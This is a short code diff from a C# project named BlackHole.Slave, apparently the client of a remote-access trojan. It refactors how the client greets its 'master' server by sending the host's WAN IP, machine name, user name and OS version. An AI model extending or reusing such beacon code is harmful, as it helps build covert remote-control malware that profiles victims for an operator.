@@ -62,14 +62,21 @@ namespace BlackHole.Slave
             m_poller.AddSocket(m_client);
             m_poller.PollTillCancelledNonBlocking();
             m_client.Connect(m_serverAddress);
-            Send(new GreetTheMasterMessage()
-            {
-                Ip = Utility.GetWanIp(),
-                MachineName = Environment.MachineName,
-                UserName = Environment.UserName,
-                OperatingSystem = Environment.OSVersion.VersionString
-            });
+
+            SendGreet();
         }        
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void SendGreet() =>
+             Send(new GreetTheMasterMessage()
+             {
+                 Ip = Utility.GetWanIp(),
+                 MachineName = WindowsHelper.MachineName,
+                 UserName = WindowsHelper.UserName,
+                 OperatingSystem = PlatformHelper.FullName
+             });
 
         /// <summary>
         /// 
@@ -90,13 +97,7 @@ namespace BlackHole.Slave
             if (m_connected && ((m_receiveTimer.ElapsedMilliseconds - m_lastReceived) > DISCONNECTION_TIMEOUT))
             {
                 SetDisconnected();
-                Send(new GreetTheMasterMessage()
-                {
-                    Ip = Utility.GetWanIp(),
-                    MachineName = Environment.MachineName,
-                    UserName = Environment.UserName,
-                    OperatingSystem = Environment.OSVersion.VersionString
-                });
+                SendGreet();
             }
         }
                 
@@ -162,6 +163,9 @@ namespace BlackHole.Slave
                 {
                     SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}");
                 });
+
+            if(message.GetType() != typeof(PingMessage))
+                Console.WriteLine(message.GetType().Name);
         }
 
 
